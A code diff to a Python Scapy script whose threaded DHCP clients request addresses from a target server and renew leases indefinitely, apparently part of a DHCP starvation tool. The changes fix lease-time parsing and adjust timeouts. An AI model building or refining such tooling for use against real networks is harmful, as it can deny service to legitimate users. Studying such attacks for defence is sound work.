@@ -17,7 +17,7 @@ OFFER = 2
 ACK = 5
 NAK = 6
 
-TIMEOUT = 1
+TIMEOUT = 3
 
 
 class Client(Thread):
@@ -52,6 +52,8 @@ class Client(Thread):
 
         self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
 
+        time_for_release = dict([ops for ops in offer_packet[DHCP].options if len(ops) == 2])['lease_time']
+
         self.request()
         ack_packet = self.sniffer(ACK)
         if not ack_packet:
@@ -59,14 +61,13 @@ class Client(Thread):
 
         self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
 
-        time_for_release = ack_packet[DHCP].lease_time
         # every loop we renew the same ip address
         while True:  # renew the lease infinite times
             sleep(time_for_release * 0.5)  # wait for 50% of the lease time
             self.request()
             ack_packet = self.sniffer(ACK)
             if ack_packet:  # receive ack packet successfully
-                time_for_release = ack_packet[DHCP].lease_time
+                time_for_release = dict([ops for ops in ack_packet[DHCP].options if len(ops) == 2])['lease_time']
                 self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
                 continue  # renew the lease
             else:  # not receiving ack
@@ -75,7 +76,7 @@ class Client(Thread):
                 ack_packet = self.sniffer(ACK)
                 if not ack_packet:  # if not receive ack packet
                     self.kill_thread()
-                time_for_release = ack_packet[DHCP].lease_time
+                time_for_release = dict([ops for ops in ack_packet[DHCP].options if len(ops) == 2])['lease_time']
 
     def sniffer(self, op):
 
@@ -101,7 +102,7 @@ class Client(Thread):
             elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                 # stop create clients, DHCP server is down
                 print('========= LOCK Locked =========')
-                sleep(TIMEOUT * 100)  # try again after TIMEOUT * 100 seconds (if real client disconnect)
+                sleep(TIMEOUT * 10)  # try again after TIMEOUT * 10 seconds (if real client disconnect)
                 Client.lock.release()
                 print('========= LOCK Release =========')
                 return False
@@ -167,7 +168,7 @@ class Client(Thread):
             op=3, chaddr=self.ch_mac, xid=self.transaction_id
         ) / DHCP(
             options=[('message-type', 'request'),
-                     ("server_id", Client.target),
+                     ('server_id', Client.target),
                      ('requested_addr', self.ip),
                      'end']
         )
